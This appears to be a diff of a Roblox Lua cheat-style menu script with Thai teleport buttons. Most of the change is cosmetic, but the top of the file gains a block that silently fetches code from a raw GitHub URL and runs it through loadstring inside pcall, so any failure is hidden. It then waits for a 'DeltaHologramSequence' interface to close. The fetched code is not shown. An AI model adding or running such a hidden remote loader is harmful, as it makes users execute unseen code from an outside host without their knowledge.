@@ -1,3 +1,15 @@
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/objwghd-maker/QQ/refs/heads/main/Script%20Lua"))()
+end)
+
+local playerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+
+repeat
+    task.wait(0.1)
+until not playerGui:FindFirstChild("DeltaHologramSequence")
+
+task.wait(0.2)
+
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local CoreGui = game:GetService("CoreGui")
@@ -216,7 +228,6 @@ local function closeMenu()
 end
 
 ToggleMenuBtn.MouseButton1Click:Connect(toggleMenu)
-
 CloseBtn.MouseButton1Click:Connect(closeMenu)
 
 local LineSeparator = Instance.new("Frame")
@@ -373,3 +384,4 @@ CreateSciFiButton("ไปที่ลงทะเบียนผู้ป่ว�
         SendNotification("เทเลพอร์ต", "เดินทางไปจุดลงทะเบียนสำเร็จ")
     end
 end)
+
